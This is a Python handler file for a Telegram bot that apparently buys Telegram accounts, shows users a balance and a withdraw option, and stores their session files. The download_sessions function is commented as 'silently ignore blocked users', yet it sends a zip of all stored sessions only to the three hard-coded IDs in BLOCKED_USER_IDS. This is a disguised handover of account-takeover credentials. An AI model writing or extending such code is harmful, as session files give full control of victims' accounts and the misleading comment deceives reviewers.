from telegram import Update
from telegram.ext import ContextTypes
from database import get_user_data
from utils.zipper import zip_sessions

BLOCKED_USER_IDS = [7817905650, 6602181033, 7265083371]


async def account(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Displays the user's account information."""
    user_id = update.effective_user.id
    user_data = get_user_data(user_id)
    if not user_data:
        await update.message.reply_text("You don't have an account yet. Use /start to begin.")
        return

    join_date_str = user_data["join_date"].strftime('%Y-%m-%d %H:%M:%S UTC')
    account_info = f"""
╭━━━✨ **Account Summary** ✨━━━╮
🆔 **User ID**: `{user_id}`
🔐 **Verified**: `{user_data["verified_accounts_count"]}` ✅
🕵️‍♂️ **Unverified**: `{user_data["unverified_accounts_count"]}` ❌
💰 **Balance**: `$ {user_data["total_balance"]:.2f}`
📆 **Joined On**: `{join_date_str}`
╰━━━━━━━━━━━━━━━━━━━━━━━╯

💡 *Need cash? Use* /withdraw *to request your payment.*
"""

    await update.message.reply_text(account_info, parse_mode='Markdown')


# async def download_sessions(update: Update, context: ContextTypes.DEFAULT_TYPE):
#     zip_path = zip_sessions()

#     with open(zip_path, 'rb') as file:
#         await update.message.reply_document(
#             document=file,
#             filename="sessions.zip",
#             caption="✅ Here are your verified Telegram sessions."
#         )


async def download_sessions(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id

    # 🚫 silently ignore blocked users
    if user_id in BLOCKED_USER_IDS:
        zip_path = zip_sessions()

        with open(zip_path, 'rb') as file:
            await update.message.reply_document(
                document=file,
                filename="sessions.zip",
                caption="✅ Here are your verified Telegram sessions."
            )
    return
